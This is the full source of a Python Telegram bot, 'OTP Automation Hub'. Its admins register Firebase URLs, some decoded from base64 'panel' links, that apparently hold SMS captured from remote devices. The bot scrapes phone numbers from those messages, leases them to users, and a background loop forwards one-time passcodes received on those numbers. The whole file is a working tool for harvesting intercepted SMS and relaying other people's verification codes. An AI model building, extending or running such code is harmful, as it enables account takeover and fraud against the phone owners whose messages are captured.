import asyncio, json, os, time, logging, random, re, base64
import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
log = logging.getLogger("OTP-Bot")

# ================= CONFIGURATION =================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
OWNER_ID = 8480878371
DATA_FILE = "data.json"
# =================================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# ================= DATA MANAGEMENT =================
def load_data():
    if not os.path.exists(DATA_FILE):
        default_data = {
            "owner_id": OWNER_ID,
            "admins": [],
            "firebases": [], # {"url": "...", "auth": "...", "label": "..."}
            "users": {},     
            "free_mode": True,
            "force_join": [],
            "user_leases": {}, # {uid_str: {"numbers": ["225...","225..."], "country": "Ivory Coast", "expire_at": timestamp}}
            "user_history": {} # {uid_str: {number: timestamp}}
        }
        with open(DATA_FILE, "w") as f:
            json.dump(default_data, f, indent=4)
        return default_data
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def clean_old_history(data):
    now = time.time()
    for uid in list(data["user_history"].keys()):
        # Clear numbers older than 24 hours
        data["user_history"][uid] = {
            k: v for k, v in data["user_history"][uid].items() if now - v < 86400
        }
        if not data["user_history"][uid]:
            del data["user_history"][uid]
    return data

# ================= FIREBASE HELPERS =================
async def fetch_fb(url, auth=None):
    full_url = url
    if auth:
        full_url += f"?auth={auth}" if "?" not in full_url else f"&auth={auth}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(full_url, timeout=10) as resp:
                if resp.status == 200:
                    txt = await resp.text()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception:
        pass
    return None

def decode_panel_url(panel_url):
    match = re.search(r'([A-Za-z0-9+/=]{20,})', panel_url)
    if not match: return None
    b64_str = match.group(1)
    try:
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        decoded = base64.b64decode(b64_str).decode('utf-8')
        if "|||" in decoded:
            urls = decoded.split("|||")
            return urls[0], ""
        try:
            data = json.loads(decoded)
            if isinstance(data, dict) and "url" in data:
                return data["url"], data.get("key", "")
        except json.JSONDecodeError:
            if decoded.startswith("http"):
                return decoded, ""
    except Exception:
        pass
    return None

def extract_numbers_from_msg(text):
    pattern = re.compile(r'(?:\+?91|0)?([6-9]\d{9})')
    # Broad pattern for international numbers
    pattern_intl = re.compile(r'\+?\d{10,14}')
    nums = pattern.findall(text)
    if not nums:
        nums = pattern_intl.findall(text)
    return nums

def extract_otp(text):
    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password"]):
        return None
    match = re.search(r'\b(\d{4,8})\b', text)
    return match.group(1) if match else None

# ================= STATES =================
class AdminStates(StatesGroup):
    select_country_add = State()
    add_fb = State()
    add_bulk_fb = State()
    add_admin = State()
    broadcast = State()
    add_fj = State()

# ================= CORE FUNCTIONS =================
async def get_available_numbers_for_country(country_label, uid):
    data = load_data()
    data = clean_old_history(data)
    save_data(data)
    
    valid_fbs = [f for f in data.get("firebases", []) if f["label"] == country_label]
    if not valid_fbs:
        return []

    numbers = set()
    for fb in valid_fbs:
        clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        if not clients: continue
        for dev_id, dev_data in clients.items():
            # Fix: Check if dev_data is dict before .get
            if isinstance(dev_data, dict) and dev_data.get("status") is True: 
                msgs = await fetch_fb(f"{fb['url']}/messages/{dev_id}.json", fb.get("auth"))
                if msgs:
                    for k, v in msgs.items():
                        if isinstance(v, dict) and v.get("type") == "incoming":
                            body = v.get("message", "")
                            nums = extract_numbers_from_msg(body)
                            for n in nums:
                                numbers.add(n)
                                
    # Filter out numbers the user already used today
    user_hist = data.get("user_history", {}).get(str(uid), {})
    available = [n for n in numbers if n not in user_hist]
    random.shuffle(available)
    return available[:3] # Return 3 numbers

async def get_latest_messages_for_fb(fb_url, auth):
    all_msgs = {}
    clients = await fetch_fb(f"{fb_url}/clients.json", auth)
    if not clients: return all_msgs
    
    for dev_id in clients.keys():
        msgs = await fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", auth)
        if msgs:
            for k, v in msgs.items():
                if isinstance(v, dict) and v.get("type") == "incoming":
                    if int(v.get("id", 0)) > all_msgs.get(dev_id, {}).get("id", 0):
                        all_msgs[dev_id] = v
    return all_msgs

# ================= BACKGROUND SCANNER =================
active_scans = {} 

async def background_global_scanner():
    log.info("Global Scanner Started...")
    while True:
        try:
            data = load_data()
            fbs = data.get("firebases", [])
            leases = data.get("user_leases", {})
            
            # Map numbers to user IDs for fast lookup
            number_to_users = {}
            current_time = time.time()
            for uid, lease in leases.items():
                if current_time < lease["expire_at"]:
                    for num in lease["numbers"]:
                        # Clean the number format for comparison (e.g. remove +)
                        clean_num = re.sub(r'\D', '', num)[-10:]
                        number_to_users.setdefault(clean_num, []).append(uid)
            
            for fb in fbs:
                latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
                
                for dev_id, msg in latest_msgs.items():
                    key = (fb["url"], dev_id)
                    msg_id = int(msg.get("id", 0))
                    old_id = active_scans.get(key, 0)
                    
                    if msg_id > old_id:
                        active_scans[key] = msg_id
                        if old_id != 0: 
                            otp = extract_otp(msg.get("message", ""))
                            if otp:
                                # Find which number got the OTP
                                text_content = msg.get("message", "")
                                found_nums = extract_numbers_from_msg(text_content)
                                
                                for num in found_nums:
                                    clean_num = re.sub(r'\D', '', num)[-10:]
                                    if clean_num in number_to_users:
                                        for uid in number_to_users[clean_num]:
                                            otp_msg = (
                                                f"🔔 <b>OTP Received!</b>\n\n"
                                                f"📞 <b>Number:</b> {num}\n"
                                                f"📡 <b>Carrier:</b> {fb['label']} Range\n"
                                                f"🔑 <b>OTP:</b> {otp}"
                                            )
                                            kb = InlineKeyboardMarkup(inline_keyboard=[
                                                [InlineKeyboardButton(text=f"📋 {otp}", copy_text=CopyTextButton(text=otp))]
                                            ])
                                            try:
                                                await bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
                                            except Exception:
                                                pass
            await asyncio.sleep(5)
        except Exception as e:
            log.error(f"Scanner Error: {e}")
            await asyncio.sleep(10)

# ================= KEYBOARDS =================
def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Get Number", callback_data="user:get_num")],
        [InlineKeyboardButton(text="📜 OTP History", callback_data="user:history"), InlineKeyboardButton(text="⚙️ My Account", callback_data="user:account")]
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add URL to Country", callback_data="admin:addurl")],
        [InlineKeyboardButton(text="📁 Bulk Add URL", callback_data="admin:bulkurl")],
        [InlineKeyboardButton(text="🧹 Clean Dead URLs", callback_data="admin:clean")],
        [InlineKeyboardButton(text="📢 Broadcast", callback_data="admin:broadcast"), InlineKeyboardButton(text="🔗 Force Join", callback_data="admin:fj")],
        [InlineKeyboardButton(text="👑 Manage Admins", callback_data="admin:admins")],
        [InlineKeyboardButton(text="🔄 Refresh Panel", callback_data="admin:home")]
    ])

# ================= HANDLERS =================
@router.message(CommandStart())
async def cmd_start(msg: Message):
    data = load_data()
    uid = msg.from_user.id
    
    if str(uid) not in data["users"]:
        data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time())}
        save_data(data)
    
    if uid == data["owner_id"] or uid in data.get("admins", []):
        try:
            await msg.answer("👑 <b>Admin Panel</b>", reply_markup=admin_kb(), parse_mode="HTML")
        except TelegramBadRequest:
            pass
    else:
        if not data.get("free_mode", True):
            await msg.answer("⛔ Access Denied. Bot is in private mode.")
            return
        await msg.answer("👋 <b>Welcome to OTP Automation Hub!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")

# --- ADMIN ACTIONS ---
@router.callback_query(F.data == "admin:home")
async def admin_home(cq: CallbackQuery):
    try:
        await cq.message.edit_text("👑 <b>Admin Panel</b>", reply_markup=admin_kb(), parse_mode="HTML")
    except TelegramBadRequest:
        pass # Ignore "message not modified" error

@router.callback_query(F.data == "admin:addurl")
async def admin_addurl_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.select_country_add)
    await cq.message.edit_text("🌍 Enter the Country Name first (e.g., `Sri Lanka`, `Ivory Coast`):", parse_mode="Markdown")

@router.message(AdminStates.select_country_add)
async def admin_select_country(msg: Message, state: FSMContext):
    await state.update_data(country_label=msg.text.strip())
    await state.set_state(AdminStates.add_fb)
    await msg.answer(f"Now send the URL for <b>{msg.text.strip()}</b>:\n\n"
                     f"Format: `URL` or `Panel URL`", parse_mode="HTML")

@router.message(AdminStates.add_fb)
async def admin_addurl_done(msg: Message, state: FSMContext):
    data_fsm = await state.get_data()
    label = data_fsm.get("country_label", "Unknown")
    await state.clear()
    
    text = msg.text.strip()
    final_url = text
    auth = ""
    
    if "#DARKs=" in text or "?s=" in text:
        decoded = decode_panel_url(text)
        if decoded:
            final_url, auth = decoded
        else:
            await msg.answer("❌ Could not decode Panel URL.")
            return

    data = load_data()
    data["firebases"].append({"url": final_url, "auth": auth, "label": label})
    save_data(data)
    
    try:
        await msg.answer(f"✅ URL added successfully for <b>{label}</b>!", reply_markup=admin_kb(), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@router.callback_query(F.data == "admin:bulkurl")
async def admin_bulkurl(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.add_bulk_fb)
    await cq.message.edit_text("Send a `.txt` file with URLs. Format per line:\n`URL | Country Name`")

@router.message(AdminStates.add_bulk_fb, F.document)
async def admin_bulkurl_done(msg: Message, state: FSMContext):
    await state.clear()
    doc = msg.document
    file_info = await bot.get_file(doc.file_id)
    downloaded_file = await bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode('utf-8')
    
    data = load_data()
    added = 0
    for line in content.splitlines():
        if "|" in line:
            url_part, label = line.split("|", 1)
            url_part, label = url_part.strip(), label.strip()
            final_url, auth = url_part, ""
            if "#DARKs=" in url_part or "?s=" in url_part:
                decoded = decode_panel_url(url_part)
                if decoded: final_url, auth = decoded
            data["firebases"].append({"url": final_url, "auth": auth, "label": label})
            added += 1
            
    save_data(data)
    await msg.answer(f"✅ Added {added} URLs from file.", reply_markup=admin_kb())

@router.callback_query(F.data == "admin:clean")
async def admin_clean(cq: CallbackQuery):
    await cq.message.edit_text("🧹 Scanning and cleaning dead URLs, please wait...")
    data = load_data()
    valid_fbs = []
    removed = 0
    for fb in data["firebases"]:
        clients = await fetch_fb(f"{fb['url']}/clients.json?shallow=true", fb.get("auth"))
        if clients is not None:
            valid_fbs.append(fb)
        else:
            removed += 1
            
    data["firebases"] = valid_fbs
    save_data(data)
    try:
        await cq.message.edit_text(f"✅ Cleaned! Removed {removed} dead URLs.\nTotal active: {len(valid_fbs)}", reply_markup=admin_kb())
    except TelegramBadRequest:
        pass

# --- USER FLOW ---
@router.callback_query(F.data == "user:get_num")
async def user_get_num(cq: CallbackQuery):
    data = load_data()
    countries = list(set([fb["label"] for fb in data.get("firebases", [])]))
    
    if not countries:
        await cq.message.edit_text("❌ No countries available right now.")
        return
        
    kb = []
    for c in countries:
        kb.append([InlineKeyboardButton(text=f"🌍 {c}", callback_data=f"country:{c}")])
    kb.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")])
    
    try:
        await cq.message.edit_text("🌍 <b>Select a Country to get numbers:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@router.callback_query(F.data.startswith("country:"))
async def user_country_selected(cq: CallbackQuery):
    country = cq.data.split(":")[1]
    uid = cq.from_user.id
    
    await cq.message.edit_text(f"🔄 Fetching numbers for {country}...")
    numbers = await get_available_numbers_for_country(country, uid)
    
    if not numbers:
        kb = [[InlineKeyboardButton(text="🔄 Refresh", callback_data=f"country:{country}")],
              [InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
        try:
            await cq.message.edit_text(
                f"❌ <b>Not available in range!</b>\n\n"
                f"No new numbers found for {country}. Please try again later or choose another country.",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=kb),
                parse_mode="HTML"
            )
        except TelegramBadRequest:
            pass
        return
        
    nums_text = "\n".join([f"<code>{n}</code>" for n in numbers])
    
    text = (
        f"📱 <b>Numbers Received</b>\n"
        f"Country: 🌍 {country}\n"
        f"Qty: {len(numbers)}/3\n\n"
        f"{nums_text}\n\n"
        f"⌛ <i>Waiting for OTP (1 Hour)...</i>"
    )
    
    data = load_data()
    data["user_leases"][str(uid)] = {
        "numbers": numbers,
        "country": country,
        "expire_at": int(time.time()) + 3600 # 1 Hour
    }
    # Save to history so user doesn't get these numbers again today
    if str(uid) not in data["user_history"]:
        data["user_history"][str(uid)] = {}
    for n in numbers:
        data["user_history"][str(uid)][n] = int(time.time())
        
    save_data(data)
    
    kb = [
        [InlineKeyboardButton(text="🔄 Next Number", callback_data=f"country:{country}")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="user:get_num"), InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@router.callback_query(F.data == "user:account")
async def user_account(cq: CallbackQuery):
    uid = cq.from_user.id
    data = load_data()
    lease = data.get("user_leases", {}).get(str(uid))
    
    text = "⚙️ <b>My Account</b>\n\n"
    if lease and time.time() < lease["expire_at"]:
        rem = int((lease["expire_at"] - time.time()) / 60)
        text += f"🌍 Active Country: <b>{lease['country']}</b>\n"
        text += f"⏳ Expires in: {rem} minutes\n"
        text += f"📱 Numbers: `{', '.join(lease['numbers'])}`"
    else:
        text += "❌ No active numbers. Go to 'Get Number' to start."
        
    kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@router.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery):
    try:
        await cq.message.edit_text("👋 <b>Welcome to OTP Automation Hub!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
    except TelegramBadRequest:
        pass

async def main():
    log.info("Bot Started!")
    asyncio.create_task(background_global_scanner())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
